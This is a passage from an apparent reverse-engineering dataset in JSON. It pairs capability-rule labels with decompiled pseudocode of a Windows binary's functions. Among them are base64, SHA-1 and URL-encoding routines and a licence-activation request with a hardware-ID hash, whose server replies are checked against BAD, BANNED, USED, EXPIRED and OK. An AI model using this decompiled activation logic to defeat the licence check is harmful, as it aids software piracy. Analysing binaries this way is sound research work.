 uVar10 = *0x436be8 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x436be8 + (*0x436be8 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x436be8 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x436bf0 + *0x436bdc;\n                    uVar5 = 1;\n                }\n                goto code_r0x00425b5b;\n            }\n            var_10h = *0x436be0 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x436be4 - 1;\n            iVar12 = *0x436be4 + (*0x436be4 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x436be4 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00425947;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00425947:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x436be8 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00425b5b:\n    var_20h = iVar12 << (0x1fU - *0x436be8 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x436bec == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x436bec == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3635
    },
    "00429182": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00429182(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0;\n    if (*(extraout_ECX + 0x12) != '\\0') {\n        fcn.00428fb0();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004281c2();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 176
    },
    "0043e640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043e640(int32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    \n    uVar3 = in_EDX >> 1;\n    if (uVar3 < 0xd) {\n        return 0;\n    }\n    uVar2 = 0;\n    if (uVar3 != 0) {\n        piVar1 = arg_8h + 4;\n        do {\n            if (((((piVar1[-2] == 0x46) && (piVar1[-1] == 0x69)) && (*piVar1 == 0x6c)) &&\n                (((piVar1[1] == 0x65 && (piVar1[2] == 0x56)) &&\n                 ((piVar1[3] == 0x65 && ((piVar1[4] == 0x72 && (piVar1[5] == 0x73)))))))) &&\n               ((piVar1[6] == 0x69 &&\n                ((((piVar1[7] == 0x6f && (piVar1[8] == 0x6e)) && (piVar1[9] == 0)) && (piVar1[10] == 0)))))) {\n                return arg_8h + 0x1a + uVar2 * 2;\n            }\n            uVar2 = uVar2 + 1;\n            piVar1 = piVar1 + 1;\n        } while (uVar2 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 370
    },
    "0043f5d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0043f5d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x20) != 0) {\n        ppiVar3 = *(in_EAX + 0x18);\n        do {\n            piVar1 = *ppiVar3;\n            if (((piVar1[2] == 2) && (piVar1[1] == arg_8h)) && (*piVar1 == arg_ch)) {\n                return piVar1;\n            }\n            uVar2 = uVar2 + 1;\n            ppiVar3 = ppiVar3 + 1;\n        } while (uVar2 < *(in_EAX + 0x20));\n    }\n    return NULL;\n}\n",
        "token_count": 216
    },
    "00441b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441b60(int32_t arg_8h, uint32_t arg_ch, uchar *arg_10h, int32_t *arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint var_4ch;\n    uchar *var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_8h == 0) || (arg_10h == NULL)) {\n        return 0;\n    }\n    puVar5 = 0x45bfe8;\n    puVar8 = &var_4ch;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = *puVar5;\n    iVar3 = *arg_14h;\n    var_8h = arg_10h + iVar3;\n    var_4h = 0;\n    puVar4 = arg_10h;\n    uVar6 = 0;\n    puVar9 = arg_10h;\n    if (arg_ch != 0) {\n        do {\n            puVar9 = puVar9 + 4;\n            uVar7 = uVar6 + 1;\n            uVar2 = *(uVar6 + arg_8h) << 0x10;\n            if (uVar7 == arg_ch) {\n                var_4h = 2;\n            }\n            else {\n                puVar1 = uVar7 + arg_8h;\n                uVar7 = uVar6 + 2;\n                uVar2 = uVar2 | *puVar1 << 8;\n                if (uVar7 == arg_ch) {\n                    var_4h = 1;\n                }\n                else {\n                    uVar2 = uVar2 | *(uVar7 + arg_8h);\n                    uVar7 = uVar6 + 3;\n                }\n            }\n            if (arg_10h + iVar3 < puVar9) {\n                return 0;\n            }\n            *puVar4 = *(&var_4ch + (uVar2 >> 0x12));\n            puVar4[1] = *(&var_4ch + (uVar2 >> 0xc & 0x3f));\n            if (var_4h < 2) {\n                puVar4[2] = *(&var_4ch + (uVar2 >> 6 & 0x3f));\n            }\n            else {\n                puVar4[2] = 0x3d;\n            }\n            if (var_4h == 0) {\n                puVar4[3] = *(&var_4ch + (uVar2 & 0x3f));\n            }\n            else {\n                puVar4[3] = 0x3d;\n            }\n            puVar4 = puVar4 + 4;\n            uVar6 = uVar7;\n        } while (uVar7 < arg_ch);\n    }\n    *arg_14h = puVar4 - arg_10h;\n    return 1;\n}\n",
        "token_count": 762
    },
    "00441c80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441c80(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    \n    if ((arg_8h == 0) || (arg_10h == 0)) {\n        return 0;\n    }\n    uVar7 = 0;\n    iVar8 = 0;\n    uVar6 = 0;\n    uVar4 = 0;\n    if (arg_ch != 0) {\n        do {\n            cVar1 = *(uVar6 + arg_8h);\n            uVar5 = uVar4;\n            if (cVar1 + 0xbfU < 0x1a) {\n                uVar2 = cVar1 - 0x41;\ncode_r0x00441cbd:\n                if (uVar2 != 0xffffffff) {\ncode_r0x00441cc2:\n                    uVar7 = uVar7 << 6 | uVar2;\n                    uVar5 = uVar4 + 6;\n                    if (7 < uVar4 + 6) {\n                        if (iVar8 == *arg_14h) {\n                            return 0;\n                        }\n                        uVar3 = uVar4 - 2;\n                        *(iVar8 + arg_10h) = uVar7 >> (uVar3 & 0x1f);\n                        uVar7 = uVar7 & (1 << (uVar3 & 0x1f)) - 1U;\n                        uVar5 = uVar4 - 2;\n                        iVar8 = iVar8 + 1;\n                    }\n                }\n            }\n            else {\n                if (cVar1 + 0x9fU < 0x1a) {\n                    uVar2 = cVar1 - 0x47;\n                    goto code_r0x00441cbd;\n                }\n                if (cVar1 - 0x30U < 10) {\n                    uVar2 = cVar1 + 4;\n                    goto code_r0x00441cbd;\n                }\n                if (cVar1 == '+') {\n                    uVar2 = 0x3e;\n                    goto code_r0x00441cc2;\n                }\n                if (cVar1 == '/') {\n                    uVar2 = 0x3f;\n                    goto code_r0x00441cc2;\n                }\n            }\n            uVar6 = uVar6 + 1;\n            uVar4 = uVar5;\n        } while (uVar6 < arg_ch);\n    }\n    *arg_14h = iVar8;\n    return 1;\n}\n",
        "token_count": 629
    },
    "00442c60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442c60(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t arg_8h_00;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    do {\n        arg_8h_00 = *arg_8h;\n        while( true ) {\n            cVar3 = fcn.00442870(arg_8h_00, &var_10h);\n            iVar2 = var_ch;\n            iVar1 = var_10h;\n            if (cVar3 == '\\0') {\n                return 0;\n            }\n            if (((var_4h == 0) && (var_8h == 1)) && (var_10h - var_ch == 1)) break;\n            fcn.00452100(arg_ch, arg_8h_00, var_10h);\n            if (iVar2 != 0) {\n                *(iVar2 + arg_ch) = (*(iVar2 + arg_8h_00) - arg_ch) + arg_8h_00;\n            }\n            arg_ch = arg_ch + iVar1;\n            var_4h = var_4h + iVar1;\n            arg_8h_00 = arg_8h_00 + iVar1;\n            if (4 < var_4h) {\n                return var_4h;\n            }\n        }\n        *arg_8h = *arg_8h + *(var_10h + -1 + arg_8h_00) + var_10h;\n    } while( true );\n}\n",
        "token_count": 393
    },
    "00445570": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445570(uint8_t *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_EDI;\n    \n    uVar5 = 0;\n    cVar1 = *(unaff_EDI + 4);\n    while (cVar1 != '\\0') {\n        uVar5 = uVar5 + 1;\n        cVar1 = *(unaff_EDI + 4 + uVar5);\n    }\n    if (arg_ch == '\\0') {\n        uVar3 = *arg_8h;\n        uVar2 = uVar5;\n        if (uVar3 != 0) {\n            while (uVar5 = uVar2,  uVar5 < 0x800) {\n                arg_8h = arg_8h + 1;\n                *(unaff_EDI + 4 + uVar5) = uVar3;\n                uVar3 = *arg_8h;\n                uVar2 = uVar5 + 1;\n                if (uVar3 == 0) {\n                    *(uVar5 + 5 + unaff_EDI) = 0;\n                    return;\n                }\n            }\n        }\n    }\n    else {\n        uVar3 = *arg_8h;\n        for (; (uVar3 != 0 && (uVar5 < 0x7fc)); uVar5 = uVar5 + 1) {\n            iVar4 = fcn.0044e331(uVar3);\n            if (((iVar4 == 0) && (((uVar3 != 0x2d && (uVar3 != 0x5f)) && (uVar3 != 0x2e)))) && (uVar3 != 0x7e)) {\n                if (uVar3 == 0x20) {\n                    *(unaff_EDI + 4 + uVar5) = 0x2b;\n                }\n                else {\n                    *(unaff_EDI + 4 + uVar5) = 0x25;\n                    *(unaff_EDI + uVar5 + 5) = *((uVar3 >> 4) + 0x45c338);\n                    uVar5 = uVar5 + 2;\n                    *(unaff_EDI + 4 + uVar5) = *((uVar3 & 0xf) + 0x45c338);\n                }\n            }\n            else {\n                *(unaff_EDI + 4 + uVar5) = uVar3;\n            }\n            uVar3 = arg_8h[1];\n            arg_8h = arg_8h + 1;\n        }\n    }\n    *(uVar5 + 4 + unaff_EDI) = 0;\n    return;\n}\n",
        "token_count": 629
    },
    "004456f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.004456f0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    uint arg_ch_00;\n    uint32_t uVar3;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint var_118h;\n    uint var_d8h;\n    uint var_98h;\n    uint var_94h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uint var_1bh;\n    uchar var_17h;\n    uchar var_16h;\n    uint var_15h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uchar var_ch;\n    uchar var_bh;\n    int32_t var_8h;\n    uchar var_4h;\n    uchar var_3h;\n    uchar var_2h;\n    \n    if ((arg_ch == '\\0') && (cVar2 = fcn.00445060(in_EAX),  in_ECX = extraout_ECX,  cVar2 == '\\0')) {\n        return 0;\n    }\n    fcn.0043f800(in_ECX, &var_60h);\n    fcn.0043fb90();\n    arg_ch_00 = fcn.004435f0();\n    var_8h = 0x40;\n    fcn.00441b60(&var_60h, arg_ch_00, &var_d8h, &var_8h);\n    var_4ch = 0;\n    var_50h = 0;\n    var_94h = 0;\n    var_98h._0_1_ = '\\0';\n    *(&var_d8h + var_8h) = 0;\n    var_48h = 0x67452301;\n    var_44h = 0xefcdab89;\n    var_40h = 0x98badcfe;\n    var_3ch = 0x10325476;\n    var_38h = 0xc3d2e1f0;\n    fcn.004418a0(0x10, &var_8h, 4);\n    fcn.004418a0(0xc, &var_8h, 4);\n    fcn.00441de0();\n    var_8h = 0x40;\n    if (var_98h == '\\0') {\n        fcn.00442310();\n        var_98h._0_1_ = '\\x01';\n    }\n    uVar3 = 0;\n    do {\n        uVar1 = (&var_48h)[uVar3];\n        (&var_34h)[uVar3] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 5);\n    fcn.00441b60(&var_34h, 0x14, &var_118h, &var_8h);\n    *(&var_118h + var_8h) = 0;\n    var_1bh._0_1_ = 0x61;\n    if (arg_ch == '\\0') {\n        var_15h._0_1_ = 0x70;\n        var_15h._2_1_ = 0x70;\n        var_1eh = 0x74;\n        var_1bh._1_1_ = 0x74;\n        var_20h = 0x61;\n        var_1fh = 99;\n        var_1dh = 0x69;\n        var_1ch = 0x76;\n        var_1bh._2_1_ = 0x69;\n        var_1bh._3_1_ = 0x6f;\n        var_17h = 0x6e;\n        var_16h = 0x2e;\n        var_15h._1_1_ = 0x68;\n        var_15h._3_1_ = 0x3f;\n        var_11h = 99;\n        var_10h = 0x6f;\n        var_fh = 100;\n        var_eh = 0x65;\n        var_dh = 0x3d;\n        var_ch = 0;\n        fcn.00445570(&var_20h, 0);\n    }\n    else {\n        var_20h = 0x74;\n        var_1bh._2_1_ = 0x74;\n        var_15h._0_1_ = 0x74;\n        var_15h._2_1_ = 0x6f;\n        var_fh = 0x6f;\n        var_1fh = 0x79;\n        var_1eh = 0x70;\n        var_1dh = 0x65;\n        var_1ch = 0x3d;\n        var_1bh._1_1_ = 99;\n        var_1bh._3_1_ = 0x69;\n        var_17h = 0x76;\n        var_16h = 0x61;\n        var_15h._1_1_ = 0x69;\n        var_15h._3_1_ = 0x6e;\n        var_11h = 0x26;\n        var_10h = 99;\n        var_eh = 100;\n        var_dh = 0x65;\n        var_ch = 0x3d;\n        var_bh = 0;\n        fcn.00445570(&var_20h, 0);\n    }\n    fcn.00445570(arg_8h, 1);\n    var_8h = 0x69776826;\n    var_4h = 100;\n    var_3h = 0x3d;\n    var_2h = 0;\n    fcn.00445570(&var_8h, 0);\n    fcn.00445570(&var_d8h, 1);\n    var_8h = 0x73616826;\n    var_4h = 0x68;\n    var_3h = 0x3d;\n    var_2h = 0;\n    fcn.00445570(&var_8h, 0);\n    fcn.00445570(&var_118h, 1);\n    if (arg_ch != '\\0') {\n        fcn.00445650();\n    }\n    return 1;\n}\n",
        "token_count": 1584
    },
    "00445990": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00445990(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    if ((in_EAX == NULL) || (*in_EAX == '\\0')) {\n        return 6;\n    }\n    iVar6 = 0;\n    pcVar5 = in_EAX;\n    do {\n        uVar2 = fcn.0044e553(*pcVar5);\n        iVar3 = fcn.0044e380(0x45c114, uVar2);\n        if (iVar3 == 0) {\n            return 6;\n        }\n        if (0x20 < iVar6) {\n            return 6;\n        }\n        pcVar5 = pcVar5 + 1;\n        iVar6 = iVar6 + 1;\n    } while (*pcVar5 != '\\0');\n    cVar1 = fcn.004456f0(in_EAX, arg_10h);\n    if (cVar1 == '\\0') {\n        return 10;\n    }\n    if (arg_10h != '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.00445110(arg_8h);\n    if (cVar1 == '\\0') {\n        return 2;\n    }\n    pcVar5 = *(arg_8h + 0x804);\n    if ((pcVar5 != NULL) && (cVar1 = *pcVar5,  cVar1 != '\\0')) {\n        if ((cVar1 == 'B') && (pcVar5[1] == 'A')) {\n            if ((pcVar5[2] == 'D') && (pcVar5[3] == '\\0')) {\n                return 6;\n            }\n            if ((((pcVar5[2] == 'N') && (pcVar5[3] == 'N')) && (pcVar5[4] == 'E')) &&\n               ((pcVar5[5] == 'D' && (pcVar5[6] == '\\0')))) {\n                return 4;\n            }\n        }\n        if (((cVar1 == 'U') && (pcVar5[1] == 'S')) &&\n           ((pcVar5[2] == 'E' && ((pcVar5[3] == 'D' && (pcVar5[4] == '\\0')))))) {\n            return 7;\n        }\n        if ((((cVar1 == 'E') && (pcVar5[1] == 'X')) && (pcVar5[2] == 'P')) &&\n           (((pcVar5[3] == 'I' && (pcVar5[4] == 'R')) &&\n            ((pcVar5[5] == 'E' && ((pcVar5[6] == 'D' && (pcVar5[7] == '\\0')))))))) {\n            return 9;\n        }\n        iVar6 = fcn.0044e380(pcVar5, 10);\n        if ((((iVar6 != 0) && (iVar6 - pcVar5 == 2)) && (*pcVar5 == 'O')) && (pcVar5[1] == 'K')) {\n            pcVar4 = pcVar5 + 3;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            if (0x3f < pcVar4 - (pcVar5 + 4)) {\n                *(arg_8h + 0x808) = pcVar5 + 3;\n                return 0;\n            }\n        }\n    }\n    return 3;\n}\n",
        "token_count": 836
    },
    "00445b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00445b50(uint arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    char cVar3;\n    uint in_EAX;\n    int32_t arg_ch_00;\n    uint uVar4;\n    uint32_t uVar5;\n    uint var_bch;\n    uint var_7ch;\n    uint var_78h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    if ((arg_10h == '\\0') && (cVar3 = fcn.00445060(in_EAX),  cVar3 == '\\0')) {\n        return 0;\n    }\n    arg_8h_00 = arg_ch;\n    pcVar1 = arg_ch + 1;\n    do {\n        cVar3 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    } while (cVar3 != '\\0');\n    arg_ch_00 = arg_ch - pcVar1;\n    arg_ch = arg_ch_00;\n    uVar4 = fcn.0044d234(arg_ch_00);\n    cVar3 = fcn.00441c80(arg_8h_00, arg_ch_00, uVar4, &arg_ch);\n    if (cVar3 == '\\0') {\n        fcn.0044d924(uVar4);\n        return 0;\n    }\n    var_30h = 0;\n    var_34h = 0;\n    var_78h = 0;\n    var_2ch = 0x67452301;\n    var_28h = 0xefcdab89;\n    var_24h = 0x98badcfe;\n    var_20h = 0x10325476;\n    var_1ch = 0xc3d2e1f0;\n    var_7ch._0_1_ = '\\0';\n    fcn.00441d90(uVar4, arg_ch);\n    arg_ch = 0x40;\n    if (var_7ch == '\\0') {\n        fcn.00442310();\n        var_7ch._0_1_ = '\\x01';\n    }\n    uVar5 = 0;\n    do {\n        uVar2 = (&var_2ch)[uVar5];\n        (&var_18h)[uVar5] = uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 5);\n    fcn.00441b60(&var_18h, 0x14, &var_bch, &arg_ch);\n    *(&var_bch + arg_ch) = 0;\n    fcn.0044d924(uVar4);\n    uVar4 = 0x45c34c;\n    if (arg_10h == '\\0') {\n        uVar4 = 0x45c364;\n    }\n    fcn.00445570(uVar4, 0);\n    fcn.00445570(&var_bch, 1);\n    if (arg_10h != '\\0') {\n        fcn.00445650();\n    }\n    return 1;\n}\n",
        "token_count": 805
    },
    "00445c90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
